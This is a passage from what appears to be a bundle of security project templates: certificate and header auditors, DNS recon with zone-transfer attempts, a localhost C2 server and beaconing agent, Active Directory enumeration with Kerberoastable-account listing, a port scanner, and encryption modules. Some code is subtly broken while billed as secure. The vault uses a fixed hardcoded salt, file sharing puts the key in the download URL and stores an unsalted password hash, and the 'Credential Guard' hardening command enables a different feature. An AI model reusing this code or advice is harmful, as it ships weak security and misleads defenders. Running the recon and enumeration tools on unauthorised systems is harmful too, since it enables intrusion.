cert.extensions:\n        if ext.oid.dotted_string == '2.5.29.17': san_ext = ext\n    result = {\n        'host': host, 'port': port, 'protocol': protocol,\n        'cipher': cipher[0] if cipher else None,\n        'subject': cert.subject.rfc4514_string(),\n        'issuer': cert.issuer.rfc4514_string(),\n        'not_before': cert.not_valid_before.isoformat(),\n        'not_after': not_after.isoformat(),\n        'days_remaining': days_left,\n        'san': str(san_ext.value) if san_ext else None,\n        'serial': hex(cert.serial_number),\n        'findings': findings,\n    }\n    return result\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--host', required=True)\n    ap.add_argument('--port', type=int, default=443)\n    ap.add_argument('--output', default='ssl_report.json')\n    args = ap.parse_args()\n    result = analyse_cert(args.host, args.port)\n    print(json.dumps(result, indent=2))\n    if result['findings']:\n        print(f'[!] {len(result["findings"])} finding(s):')\n        for f in result['findings']: print(f'  [{f["severity"]}] {f["issue"]}')\n    with open(args.output, 'w') as f: json.dump(result, f, indent=2)\n`,
      "requirements.txt": `cryptography>=41.0.0\n`,
    },

    // ── HTTP Security Header Auditor ─────────────────────────────────────────────
    "header-auditor": {
      "README.md": `# HTTP Security Header Auditor\n\nScan websites for missing or misconfigured security headers.\n\n\`\`\`bash\npython3 header_audit.py --url https://example.com\npython3 header_audit.py --urls-file targets.txt --report headers_report.json\n\`\`\`\n`,
      "header_audit.py": `#!/usr/bin/env python3\nimport argparse, requests, json\nfrom datetime import datetime\n\nHEADER_RULES = [\n  ('Strict-Transport-Security', 'HSTS missing — enable HTTPS enforcement', 'HIGH',\n   lambda v: 'max-age' in v and int(v.split('max-age=')[1].split(';')[0]) >= 31536000),\n  ('Content-Security-Policy', 'CSP missing — enables XSS and data injection attacks', 'HIGH', lambda v: bool(v)),\n  ('X-Frame-Options', 'Clickjacking protection missing', 'MEDIUM', lambda v: v.upper() in ('DENY','SAMEORIGIN')),\n  ('X-Content-Type-Options', 'MIME sniffing protection missing', 'MEDIUM', lambda v: v.lower() == 'nosniff'),\n  ('Referrer-Policy', 'Referrer policy missing', 'LOW', lambda v: bool(v)),\n  ('Permissions-Policy', 'Permissions policy missing', 'LOW', lambda v: bool(v)),\n  ('X-XSS-Protection', 'Legacy XSS filter header', 'INFO', lambda v: bool(v)),\n]\n\nCSP_CHECKS = [\n  (\"'unsafe-inline'\", 'CSP allows unsafe-inline scripts', 'HIGH'),\n  (\"'unsafe-eval'\", 'CSP allows unsafe-eval', 'HIGH'),\n  ('*', 'CSP has wildcard source', 'MEDIUM'),\n]\n\ndef audit_url(url: str) -> dict:\n    try:\n        r = requests.get(url, timeout=10, allow_redirects=True, verify=True)\n    except Exception as e:\n        return {'url': url, 'error': str(e), 'findings': []}\n    headers = {k.lower(): v for k, v in r.headers.items()}\n    findings = []\n    for name, message, severity, validator in HEADER_RULES:\n        val = headers.get(name.lower(), '')\n        if not val:\n            findings.append({'header': name, 'severity': severity, 'issue': message, 'value': None})\n        elif not validator(val):\n            findings.append({'header': name, 'severity': 'MEDIUM', 'issue': f'{name} present but misconfigured', 'value': val})\n    csp = headers.get('content-security-policy', '')\n    for pattern, msg, sev in CSP_CHECKS:\n        if pattern in csp: findings.append({'header': 'CSP', 'severity': sev, 'issue': msg, 'value': csp[:100]})\n    return {'url': url, 'status': r.status_code, 'server': headers.get('server',''), 'findings': findings}\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--url')\n    ap.add_argument('--urls-file')\n    ap.add_argument('--report', default='headers_report.json')\n    args = ap.parse_args()\n    urls = []\n    if args.url: urls.append(args.url)\n    if args.urls_file:\n        with open(args.urls_file) as f: urls.extend(l.strip() for l in f if l.strip())\n    results = [audit_url(u) for u in urls]\n    with open(args.report, 'w') as f: json.dump({'timestamp': datetime.now().isoformat(), 'results': results}, f, indent=2)\n    for r in results:\n        total = len(r.get('findings',[]))\n        print(f'{r["url"]}: {total} findings')\n        for fnd in r.get('findings', [])[:3]: print(f'  [{fnd["severity"]}] {fnd["issue"]}')\n`,
      "requirements.txt": `requests>=2.31.0\n`,
    },

    // ── DNS Reconnaissance & Enumeration Toolkit ─────────────────────────────────
    "dns-recon": {
      "README.md": `# DNS Reconnaissance & Enumeration Toolkit\n\nComprehensive DNS recon: zone transfer, record enumeration, typosquat detection, and DNSSEC analysis.\n\n\`\`\`bash\npython3 dns_recon.py --domain example.com\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "dns_recon.py": `#!/usr/bin/env python3\nimport argparse, dns.resolver, dns.zone, dns.query, json\nfrom datetime import datetime\n\nRECORD_TYPES = ['A','AAAA','MX','NS','TXT','SOA','CNAME','SRV','CAA','DNSKEY','DS']\n\ndef query_records(domain: str) -> dict:\n    results = {}\n    resolver = dns.resolver.Resolver()\n    resolver.timeout = 5\n    for rtype in RECORD_TYPES:\n        try:\n            ans = resolver.resolve(domain, rtype)\n            results[rtype] = [str(r) for r in ans]\n        except (dns.resolver.NXDOMAIN, dns.resolver.NoAnswer, dns.exception.Timeout): pass\n        except Exception: pass\n    return results\n\ndef try_zone_transfer(domain: str) -> list:\n    found = []\n    resolver = dns.resolver.Resolver()\n    try:\n        ns_records = resolver.resolve(domain, 'NS')\n        for ns in ns_records:\n            try:\n                z = dns.zone.from_xfr(dns.query.xfr(str(ns), domain, timeout=5))\n                found.extend([str(n) + '.' + domain for n in z.nodes.keys()])\n            except: pass\n    except: pass\n    return found\n\ndef check_spf(records: dict) -> list:\n    findings = []\n    txts = records.get('TXT', [])\n    spf = next((t for t in txts if 'v=spf1' in t), None)\n    if not spf: findings.append({'issue': 'No SPF record', 'severity': 'HIGH'})\n    elif '+all' in spf: findings.append({'issue': 'SPF allows ALL senders (+all)', 'severity': 'CRITICAL'})\n    dmarc_txts = records.get('TXT', [])\n    if not any('v=DMARC1' in t for t in dmarc_txts): findings.append({'issue': 'No DMARC record', 'severity': 'MEDIUM'})\n    return findings\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--domain', required=True)\n    ap.add_argument('--output', default='dns_report.json')\n    args = ap.parse_args()\n    print(f'[*] DNS Recon for {args.domain}')\n    print('[*] AUTHORISED USE ONLY')\n    records = query_records(args.domain)\n    zone_hosts = try_zone_transfer(args.domain)\n    email_findings = check_spf(records)\n    report = {'domain': args.domain, 'timestamp': datetime.now().isoformat(),\n              'records': records, 'zone_transfer_hosts': zone_hosts, 'findings': email_findings}\n    with open(args.output, 'w') as f: json.dump(report, f, indent=2)\n    print(f'[+] Records found: {list(records.keys())}')\n    if zone_hosts: print(f'[!] Zone transfer successful: {len(zone_hosts)} hosts')\n    for f in email_findings: print(f'  [{f["severity"]}] {f["issue"]}')\n`,
      "requirements.txt": `dnspython>=2.4.0\n`,
    },

    // ── Password Manager Core Engine ─────────────────────────────────────────────
    "password-manager": {
      "README.md": `# Password Manager Core Engine\n\nSecure, local-first password manager engine with AES-256-GCM encryption.\n\n\`\`\`typescript\nimport { PasswordVault } from './vault';\nconst vault = new PasswordVault('my-master-password');\nawait vault.add({ site: 'github.com', username: 'user', password: 'secret' });\n\`\`\`\n`,
      "vault.ts": `import { createCipheriv, createDecipheriv, randomBytes, scryptSync } from 'crypto';\nimport { readFileSync, writeFileSync, existsSync } from 'fs';\n\ninterface Credential { id: string; site: string; username: string; password: string; notes?: string; createdAt: string; updatedAt: string; }\n\nexport class PasswordVault {\n  private key: Buffer;\n  private dbPath: string;\n  private entries: Credential[] = [];\n\n  constructor(masterPassword: string, dbPath = 'vault.enc') {\n    const salt = Buffer.from('titan-vault-salt-v1');\n    this.key = scryptSync(masterPassword, salt, 32);\n    this.dbPath = dbPath;\n    if (existsSync(dbPath)) this.entries = this.decrypt(readFileSync(dbPath));\n  }\n\n  private encrypt(data: Credential[]): Buffer {\n    const iv = randomBytes(12);\n    const cipher = createCipheriv('aes-256-gcm', this.key, iv);\n    const enc = Buffer.concat([cipher.update(JSON.stringify(data), 'utf8'), cipher.final()]);\n    const tag = cipher.getAuthTag();\n    return Buffer.concat([iv, tag, enc]);\n  }\n\n  private decrypt(buf: Buffer): Credential[] {\n    const iv = buf.subarray(0, 12);\n    const tag = buf.subarray(12, 28);\n    const enc = buf.subarray(28);\n    const decipher = createDecipheriv('aes-256-gcm', this.key, iv);\n    decipher.setAuthTag(tag);\n    const dec = Buffer.concat([decipher.update(enc), decipher.final()]);\n    return JSON.parse(dec.toString('utf8'));\n  }\n\n  private save() { writeFileSync(this.dbPath, this.encrypt(this.entries)); }\n\n  add(cred: Omit<Credential, 'id' | 'createdAt' | 'updatedAt'>): Credential {\n    const entry: Credential = { ...cred, id: randomBytes(8).toString('hex'), createdAt: new Date().toISOString(), updatedAt: new Date().toISOString() };\n    this.entries.push(entry);\n    this.save();\n    return entry;\n  }\n\n  get(id: string): Credential | undefined { return this.entries.find(e => e.id === id); }\n  list(): Omit<Credential, 'password'>[] { return this.entries.map(({ password, ...e }) => e); }\n  search(query: string): Credential[] { return this.entries.filter(e => e.site.includes(query) || e.username.includes(query)); }\n\n  update(id: string, updates: Partial<Omit<Credential, 'id' | 'createdAt'>>): void {\n    const idx = this.entries.findIndex(e => e.id === id);\n    if (idx === -1) throw new Error('Entry not found');\n    this.entries[idx] = { ...this.entries[idx], ...updates, updatedAt: new Date().toISOString() };\n    this.save();\n  }\n\n  delete(id: string): void {\n    this.entries = this.entries.filter(e => e.id !== id);\n    this.save();\n  }\n\n  generatePassword(length = 20): string {\n    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+';\n    const bytes = randomBytes(length);\n    return [...bytes].map(b => chars[b % chars.length]).join('');\n  }\n}\n`,
      "package.json": `{\n  \"name\": \"password-manager-engine\",\n  \"version\": \"1.0.0\",\n  \"main\": \"vault.ts\",\n  \"dependencies\": {}\n}\n`,
    },

    // ── Secure File Sharing Module ───────────────────────────────────────────────
    "secure-file-sharing": {
      "README.md": `# Secure File Sharing Module\n\nEnd-to-end encrypted file sharing with expiry, password protection, and audit logging.\n\n\`\`\`typescript\nimport { SecureShare } from './secure-share';\nconst share = new SecureShare({ storageDir: './uploads' });\nconst link = await share.upload(fileBuffer, { password: 'secret', expiresIn: '24h' });\n\`\`\`\n`,
      "secure-share.ts": `import { createCipheriv, createDecipheriv, randomBytes, scryptSync, createHash } from 'crypto';\nimport { writeFileSync, readFileSync, existsSync, mkdirSync } from 'fs';\nimport { join } from 'path';\n\ninterface ShareOptions { password?: string; expiresIn?: string; maxDownloads?: number; }\ninterface ShareRecord { id: string; filename: string; passwordHash?: string; expiresAt?: string; maxDownloads?: number; downloads: number; }\n\nfunction parseExpiry(s: string): Date {\n  const match = s.match(/^(\\d+)(h|d|m)$/);\n  if (!match) throw new Error('Invalid expiry format. Use: 24h, 7d, 30m');\n  const [, n, unit] = match;\n  const ms = { h: 3600000, d: 86400000, m: 60000 }[unit as 'h'|'d'|'m']!;\n  return new Date(Date.now() + parseInt(n) * ms);\n}\n\nexport class SecureShare {\n  private dir: string;\n  private db: Map<string, ShareRecord> = new Map();\n\n  constructor({ storageDir = './uploads' } = {}) {\n    this.dir = storageDir;\n    if (!existsSync(this.dir)) mkdirSync(this.dir, { recursive: true });\n  }\n\n  private encryptFile(data: Buffer, password: string): Buffer {\n    const salt = randomBytes(16);\n    const key = scryptSync(password, salt, 32);\n    const iv = randomBytes(12);\n    const cipher = createCipheriv('aes-256-gcm', key, iv);\n    const enc = Buffer.concat([cipher.update(data), cipher.final()]);\n    const tag = cipher.getAuthTag();\n    return Buffer.concat([salt, iv, tag, enc]);\n  }\n\n  async upload(data: Buffer, filename: string, opts: ShareOptions = {}): Promise<string> {\n    const id = randomBytes(16).toString('hex');\n    const record: ShareRecord = { id, filename, downloads: 0 };\n    const password = opts.password ?? randomBytes(16).toString('base64');\n    const encrypted = this.encryptFile(data, password);\n    writeFileSync(join(this.dir, id + '.enc'), encrypted);\n    if (opts.password) record.passwordHash = createHash('sha256').update(opts.password).digest('hex');\n    if (opts.expiresIn) record.expiresAt = parseExpiry(opts.expiresIn).toISOString();\n    if (opts.maxDownloads) record.maxDownloads = opts.maxDownloads;\n    this.db.set(id, record);\n    return \`/download/\${id}?key=\${password}\`;\n  }\n\n  async download(id: string, password: string): Promise<{ data: Buffer; filename: string }> {\n    const record = this.db.get(id);\n    if (!record) throw new Error('File not found');\n    if (record.expiresAt && new Date(record.expiresAt) < new Date()) throw new Error('Link has expired');\n    if (record.maxDownloads && record.downloads >= record.maxDownloads) throw new Error('Download limit reached');\n    if (record.passwordHash && createHash('sha256').update(password).digest('hex') !== record.passwordHash) throw new Error('Invalid password');\n    const encrypted = readFileSync(join(this.dir, id + '.enc'));\n    const salt = encrypted.subarray(0, 16);\n    const iv = encrypted.subarray(16, 28);\n    const tag = encrypted.subarray(28, 44);\n    const enc = encrypted.subarray(44);\n    const key = scryptSync(password, salt, 32);\n    const decipher = createDecipheriv('aes-256-gcm', key, iv);\n    decipher.setAuthTag(tag);\n    record.downloads++;\n    return { data: Buffer.concat([decipher.update(enc), decipher.final()]), filename: record.filename };\n  }\n}\n`,
    },

  
    // ── Red Team C2 Framework Educational ────────────────────────────────────────
    "c2-framework": {
      "README.md": `# Red Team C2 Framework — Educational\n\nEducational command and control framework for red team operations and security research.\nAll communications simulated in local sandbox — no real C2 traffic.\n\n\`\`\`bash\npython3 c2_server.py --host 127.0.0.1 --port 4444\npython3 agent_sim.py --c2 127.0.0.1:4444\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "c2_server.py": `#!/usr/bin/env python3\n\"\"\"Educational C2 Server Simulator — LOCAL SANDBOX ONLY\"\"\"\nimport socket, threading, json, datetime, argparse\n\nclass C2Server:\n    def __init__(self, host: str, port: int):\n        self.host = host; self.port = port\n        self.agents: dict = {}\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)\n\n    def handle_agent(self, conn: socket.socket, addr):\n        agent_id = f'{addr[0]}:{addr[1]}'\n        print(f'[+] Agent connected: {agent_id}')\n        self.agents[agent_id] = {'addr': addr, 'connected_at': datetime.datetime.now().isoformat()}\n        try:\n            while True:\n                data = conn.recv(4096)\n                if not data: break\n                msg = json.loads(data.decode())\n                print(f'[{agent_id}] {msg.get("type")}: {msg.get("data","")[:100]}')\n                conn.send(json.dumps({'cmd': 'sleep', 'interval': 5}).encode())\n        finally:\n            del self.agents[agent_id]\n            print(f'[-] Agent disconnected: {agent_id}')\n\n    def start(self):\n        self.sock.bind((self.host, self.port))\n        self.sock.listen(10)\n        print(f'[*] Educational C2 Server listening on {self.host}:{self.port}')\n        print('[*] LOCAL SANDBOX ONLY — educational use')\n        while True:\n            conn, addr = self.sock.accept()\n            threading.Thread(target=self.handle_agent, args=(conn, addr), daemon=True).start()\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--host', default='127.0.0.1')\n    ap.add_argument('--port', type=int, default=4444)\n    args = ap.parse_args()\n    C2Server(args.host, args.port).start()\n`,
      "agent_sim.py": `#!/usr/bin/env python3\n\"\"\"Educational Agent Simulator — demonstrates agent-server communication patterns\"\"\"\nimport socket, json, time, argparse, platform\n\ndef simulate_agent(c2_host: str, c2_port: int, interval: int = 5):\n    print(f'[*] Educational Agent Simulator connecting to {c2_host}:{c2_port}')\n    print('[*] SIMULATION ONLY — no real malicious activity')\n    while True:\n        try:\n            with socket.create_connection((c2_host, c2_port), timeout=10) as sock:\n                while True:\n                    beacon = {'type': 'beacon', 'data': platform.system(),\n                              'ts': time.time(), 'simulation': True}\n                    sock.send(json.dumps(beacon).encode())\n                    data = sock.recv(4096)\n                    cmd = json.loads(data.decode())\n                    print(f'[*] Received command: {cmd.get("cmd")}')\n                    time.sleep(cmd.get('interval', interval))\n        except Exception as e:\n            print(f'[*] Reconnecting in {interval}s: {e}')\n            time.sleep(interval)\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--c2', default='127.0.0.1:4444')\n    ap.add_argument('--interval', type=int, default=5)\n    args = ap.parse_args()\n    host, port = args.c2.split(':')\n    simulate_agent(host, int(port), args.interval)\n`,
    },

    // ── AI-Powered Threat Intelligence Platform ───────────────────────────────────
    "threat-intel": {
      "README.md": `# AI-Powered Threat Intelligence Platform\n\nAggregates, correlates, and analyses threat intelligence from multiple public feeds.\n\n\`\`\`bash\npip install -r requirements.txt\npython3 threat_intel.py --feeds all --output report.json\n\`\`\`\n`,
      "threat_intel.py": `#!/usr/bin/env python3\nimport argparse, requests, json, re\nfrom datetime import datetime\n\nFEEDS = {\n  'abuse_ch': 'https://feodotracker.abuse.ch/downloads/ipblocklist.json',\n  'urlhaus':  'https://urlhaus-api.abuse.ch/v1/urls/recent/',\n  'threatfox': 'https://threatfox-api.abuse.ch/api/v1/',\n}\n\ndef fetch_abuse_ch() -> list:\n    try:\n        r = requests.get(FEEDS['abuse_ch'], timeout=15)\n        data = r.json()\n        return [{'ioc': h.get('ip_address'), 'type': 'ip', 'source': 'abuse.ch/feodo',\n                 'tags': [h.get('malware','')], 'first_seen': h.get('first_seen','')}\n                for h in (data if isinstance(data, list) else [])][:50]\n    except Exception as e: print(f'[!] abuse.ch feed error: {e}'); return []\n\ndef fetch_urlhaus() -> list:\n    try:\n        r = requests.post(FEEDS['urlhaus'], data={'limit': 50}, timeout=15)\n        data = r.json()\n        return [{'ioc': u.get('url'), 'type': 'url', 'source': 'urlhaus',\n                 'tags': [u.get('threat','')], 'first_seen': u.get('dateadded','')}\n                for u in data.get('urls', [])]\n    except Exception as e: print(f'[!] urlhaus feed error: {e}'); return []\n\ndef enrich_ioc(ioc: dict) -> dict:\n    ioc['enriched'] = True\n    if ioc['type'] == 'ip':\n        ioc['rdns'] = None  # add rDNS lookup if needed\n        ioc['asn'] = None\n    return ioc\n\ndef correlate(iocs: list) -> dict:\n    by_type = {}\n    for ioc in iocs:\n        t = ioc.get('type','unknown')\n        by_type.setdefault(t, []).append(ioc)\n    tags = {}\n    for ioc in iocs:\n        for tag in ioc.get('tags', []):\n            if tag: tags[tag] = tags.get(tag, 0) + 1\n    top_tags = sorted(tags.items(), key=lambda x: x[1], reverse=True)[:10]\n    return {'total_iocs': len(iocs), 'by_type': {k: len(v) for k,v in by_type.items()},\n            'top_threats': [{'tag': t, 'count': c} for t,c in top_tags]}\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--feeds', default='all')\n    ap.add_argument('--output', default='threat_report.json')\n    args = ap.parse_args()\n    iocs = []\n    if args.feeds in ('all','abuse_ch'): iocs.extend(fetch_abuse_ch())\n    if args.feeds in ('all','urlhaus'): iocs.extend(fetch_urlhaus())\n    enriched = [enrich_ioc(i) for i in iocs]\n    summary = correlate(enriched)\n    report = {'timestamp': datetime.now().isoformat(), 'summary': summary, 'iocs': enriched}\n    with open(args.output, 'w') as f: json.dump(report, f, indent=2)\n    print(f'[+] {len(enriched)} IOCs collected. Report: {args.output}')\n    print(f'Top threats: {summary["top_threats"][:5]}')\n`,
      "requirements.txt": `requests>=2.31.0\n`,
    },

    // ── Active Directory Attack & Defense Toolkit ─────────────────────────────────
    "active-directory": {
      "README.md": `# Active Directory Attack & Defense Toolkit\n\nBlue and red team tools for Active Directory environments.\n\nIncludes:\n- AD enumeration (users, groups, GPOs, ACLs)\n- Kerberoasting simulation\n- BloodHound data ingestor\n- Defensive hardening scripts\n\n\`\`\`bash\npython3 ad_tools.py --mode enum --dc 10.0.0.1 --domain CORP --user admin --password 'P@ss'\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "ad_tools.py": `#!/usr/bin/env python3\nimport argparse\n\ndef enumerate_ad(dc: str, domain: str, user: str, password: str):\n    print(f'[*] Enumerating AD: {domain} via {dc}')\n    print('[*] AUTHORISED USE ONLY — requires valid domain credentials')\n    try:\n        from ldap3 import Server, Connection, ALL, NTLM\n        server = Server(dc, get_info=ALL)\n        conn = Connection(server, user=f'{domain}\\\\{user}', password=password, authentication=NTLM, auto_bind=True)\n        base_dn = ','.join([f'DC={d}' for d in domain.split('.')])\n        # Enumerate users\n        conn.search(base_dn, '(objectClass=person)', attributes=['cn','mail','sAMAccountName','memberOf'])\n        users = [{'cn': str(e.cn), 'sam': str(e.sAMAccountName)} for e in conn.entries]\n        print(f'[+] Found {len(users)} users')\n        # Enumerate groups\n        conn.search(base_dn, '(objectClass=group)', attributes=['cn','member'])\n        groups = [str(e.cn) for e in conn.entries]\n        print(f'[+] Found {len(groups)} groups')\n        # Find privileged accounts\n        conn.search(base_dn, '(&(objectClass=person)(memberOf=CN=Domain Admins,*))' , attributes=['cn'])\n        da = [str(e.cn) for e in conn.entries]\n        if da: print(f'[!] Domain Admins: {da}')\n        return {'users': users, 'groups': groups, 'domain_admins': da}\n    except ImportError: print('[!] Install ldap3: pip install ldap3'); return {}\n\ndef check_kerberoastable(dc: str, domain: str, user: str, password: str):\n    print('[*] Checking for Kerberoastable accounts (SPNs)')\n    try:\n        from ldap3 import Server, Connection, ALL, NTLM\n        server = Server(dc, get_info=ALL)\n        conn = Connection(server, user=f'{domain}\\\\{user}', password=password, authentication=NTLM, auto_bind=True)\n        base_dn = ','.join([f'DC={d}' for d in domain.split('.')])\n        conn.search(base_dn, '(&(objectClass=person)(servicePrincipalName=*))', attributes=['cn','servicePrincipalName'])\n        targets = [{'cn': str(e.cn), 'spns': list(e.servicePrincipalName)} for e in conn.entries]\n        print(f'[!] Kerberoastable accounts: {len(targets)}')\n        for t in targets: print(f'  - {t["cn"]}: {t["spns"]}')\n        return targets\n    except ImportError: print('[!] Install ldap3: pip install ldap3'); return []\n\ndef hardening_check():\n    recommendations = [\n        {'check': 'Enable LDAP signing', 'risk': 'HIGH', 'cmd': 'Set-ItemProperty -Path HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Services\\\\NTDS\\\\Parameters -Name \"LDAPServerIntegrity\" -Value 2'},\n        {'check': 'Disable NTLM v1', 'risk': 'HIGH', 'cmd': 'Set-ItemProperty HKLM:\\\\SYSTEM\\\\CurrentControlSet\\\\Control\\\\Lsa -Name LmCompatibilityLevel -Value 5'},\n        {'check': 'Enable Protected Users group', 'risk': 'HIGH', 'cmd': 'Add-ADGroupMember -Identity \"Protected Users\" -Members Domain Admins'},\n        {'check': 'Disable print spooler on DCs', 'risk': 'HIGH', 'cmd': 'Stop-Service Spooler; Set-Service Spooler -StartupType Disabled'},\n        {'check': 'Enable Credential Guard', 'risk': 'HIGH', 'cmd': 'Enable-WindowsOptionalFeature -Online -FeatureName Windows-Defender-ApplicationGuard'},\n    ]\n    print('[*] AD Hardening Recommendations:')\n    for r in recommendations: print(f'  [{r["risk"]}] {r["check"]}')\n    return recommendations\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--mode', choices=['enum','kerberoast','harden'], required=True)\n    ap.add_argument('--dc')\n    ap.add_argument('--domain')\n    ap.add_argument('--user')\n    ap.add_argument('--password')\n    args = ap.parse_args()\n    if args.mode == 'enum': enumerate_ad(args.dc, args.domain, args.user, args.password)\n    elif args.mode == 'kerberoast': check_kerberoastable(args.dc, args.domain, args.user, args.password)\n    elif args.mode == 'harden': hardening_check()\n`,
      "requirements.txt": `ldap3>=2.9.0\nimpacket>=0.11.0\n`,
    },

    // ── Enterprise Penetration Testing Framework ─────────────────────────────────
    "pentest-framework": {
      "README.md": `# Enterprise Penetration Testing Framework\n\nComprehensive pentest framework covering recon, exploitation, post-exploitation, and reporting.\n\n\`\`\`bash\npython3 pentest.py --target 192.168.1.0/24 --phase recon\npython3 pentest.py --target 192.168.1.100 --phase vuln\n\`\`\`\n\n\n---\n## Legal Notice\nFor authorised security testing and educational use only. Authors accept no liability for misuse.\n`,
      "pentest.py": `#!/usr/bin/env python3\nimport argparse, subprocess, json, socket, concurrent.futures\nfrom datetime import datetime\n\ndef port_scan(target: str, ports: range = range(1, 1025)) -> list:\n    open_ports = []\n    def check(port):\n        try:\n            with socket.create_connection((target, port), timeout=0.5): return port\n        except: return None\n    with concurrent.futures.ThreadPoolExecutor(max_workers=200) as ex:\n        results = ex.map(check, ports)\n    return [p for p in results if p]\n\ndef service_fingerprint(host: str, port: int) -> dict:\n    banner = ''\n    try:\n        with socket.create_connection((host, port), timeout=3) as s:\n            s.send(b'HEAD / HTTP/1.0\\r\\n\\r\\n')\n            banner = s.recv(1024).decode('utf-8', errors='ignore').strip()\n    except: pass\n    return {'port': port, 'banner': banner[:200]}\n\ndef run_recon(target: str):\n    print(f'[*] Phase 1: Reconnaissance — {target}')\n    print('[*] AUTHORISED USE ONLY')\n    results = {'target': target, 'timestamp': datetime.now().isoformat(), 'phase': 'recon', 'ports': []}\n    print('[*] Scanning ports 1-1024...')\n    open_ports = port_scan(target)\n    print(f'[+] Open ports: {open_ports}')\n    for port in open_ports[:10]:\n        svc = service_fingerprint(target, port)\n        results['ports'].append(svc)\n    with open('recon_results.json', 'w') as f: json.dump(results, f, indent=2)\n    return results\n\nif __name__ == '__main__':\n    ap = argparse.ArgumentParser()\n    ap.add_argument('--target', required=True)\n    ap.add_argument('--phase', choices=['recon','vuln','report'], default='recon')\n    args = ap.parse_args()\n    if args.phase == 'recon': run_recon(args.target)\n    else: print(f'[*] Phase {args.phase} — see docs for full framework capabilities')\n`,
      "reports/template.md": `# Penetration Test Report\n\n**Client:** [CLIENT NAME]\n**Date:** [DATE]\n**Tester:** [TESTER NAME]\n**Scope:** [SCOPE]\n\n## Executive Summary\n[HIGH LEVEL SUMMARY]\n\n## Findings\n### [FINDING TITLE] — [SEVERITY]\n**CVSS Score:** [SCORE]\n**Description:** [DESCRIPTION]\n**Impact:** [IMPACT]\n**Proof of Concept:** [POC]\n**Remediation:** [REMEDIATION]\n\n## Appendix\n- [TOOL OUTPUTS]\n`,
    },

    // ── Zero Trust Network Architecture Blueprint ─────────────────────────────────
    "zero-trust": {
      "README.md": `# Zero Trust Network Architecture Blueprint\n\nComplete Zero Trust implementation guide with code, configs, and infrastructure templates.\n\n## Principles\n1. Verify explicitly — always authenticate and authorise\n2. Use least privileged access\n3. Assume breach — minimise blast radius\n`,
      "middleware/zero-trust.ts": `import type { Request, Response, NextFunction } from 'express';\nimport jwt from 'jsonwebtoken';\n\ninterface ZeroTrustConfig {\n  jwtSecret: string;\n  allowedDeviceIds?: string[];\n  requireMfa?: boolean;\n  allowedIps?: string[];\n}\n\nexport function zeroTrustMiddleware(config: ZeroTrustConfig) {\n  return async (req: Request, res: Response, next: NextFunction) => {\n    // 1. Verify identity (JWT)\n    const token = req.headers.authorization?.replace('Bearer ', '');\n    if (!token) return res.status(401).json({ error: 'No token provided' });\n    let user;\n    try { user = jwt.verify(token, config.jwtSecret); } catch { return res.status(401).json({ error: 'Invalid token' }); }\n    // 2. Verify device (device ID header)\n    const deviceId = req.headers['x-device-id'] as string;\n    if (config.allowedDeviceIds && deviceId && !config.allowedDeviceIds.includes(deviceId))\n      return res.status(403).json({ error: 'Device not enrolled' });\n    // 3. Check MFA\n    if (config.requireMfa && !(user as any).mfaVerified)\n      return res.status(403).json({ error: 'MFA required' });\n    // 4. IP allowlist (optional)\n    if (config.allowedIps) {\n      const ip = req.ip ?? '';\n      if (!config.allowedIps.some(allowed => ip.startsWith(allowed)))\n        return res.status(403).json({ error: 'IP not allowed' });\n    }\n    // 5. Log access\n    console.log(\`[ZeroTrust] Access granted: \${(user as any).sub} from \${req.ip} to \${req.path}\`);\n    (req as any).user = user;\n    next();\n  };\n}\n`,
      "policies/rbac.ts": `export type Permission = 'read' | 'write' | 'admin' | 'delete';\nexport type Role = 'viewer' | 'editor' | 'admin' | 'superadmin';\n\nconst ROLE_PERMISSIONS: Record<Role, Permission[]> = {\n  viewer: ['read'],\n  editor: ['read', 'write'],\n  admin: ['read', 'write', 'delete'],\n  superadmin: ['read', 'write', 'delete', 'admin'],\n};\n\nexport function hasPermission(role: Role, permission: Permission): boolean {\n  return ROLE_PERMISSIONS[role]?.includes(permission) ?? false;\n}\n\nexport function requirePermission(permission: Permission) {\n  return (req: any, res: any, next: any) => {\n    const role = req.user?.role as Role;\n    if (!role || !hasPermission(role, permission))\n      return res.status(403).json({ error: \`Permission denied: requires \${permission}\` });\n    next();\n  };\n}\n`,
    },

    // ── Compliance Automation Suite ───────────────────────────────────────────────
    "compliance-automation": {
      "README.md": `# Compliance Automation Suite — SOC2 / ISO27001 / GDPR\n\nAutomate evidence collection, control mapping, and compliance reporting.\n\n\`\`\`bash\npython3 compliance.py --framework soc2 --output report.json\npython3 compliance.py --framework gdpr --output gdpr_gap.json\n\`\`\`\n`,
